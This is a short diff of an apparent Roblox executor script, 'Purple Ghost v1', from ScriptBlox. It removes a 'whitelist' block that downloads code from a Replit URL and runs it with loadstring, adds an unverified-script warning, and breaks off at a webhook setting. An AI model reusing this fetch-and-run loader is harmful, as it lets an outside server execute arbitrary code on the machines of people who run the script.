@@ -1,22 +1,8 @@
---// WHITELIST GATEWAY CHECK
-local whitelistUrl = "https://a8585d70-7133-4193-bb7e-e7ee777c1dd0-00-105wmbv6br0tx.picard.replit.dev/api/raw/182b864a00b0dff62eec2f270136106674933546717324cc280288935a1c8619"
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
 
-local success, result = pcall(function()
-    return game:HttpGet(whitelistUrl)
-end)
-
-if not success or result:find("Not Whitelisted") or result == "" then
-    -- If Replit is asleep, dead, or says No, stop execution here
-    return warn("❌ Whitelist Verification Failed: Server Offline or Access Denied.")
-else
-    -- If the server returns valid code, run it
-    local runScript = loadstring(result)
-    if runScript then task.spawn(runScript) end
-end
-
---================================================================================
---// THE REST OF YOUR CONFIG & UI CODE CONTINUES SAFELY BELOW HERE
---================================================================================
+--// CONFIG
 getgenv().whscript = "Purple Ghost v1"
 
 getgenv().webhookexecUrl =
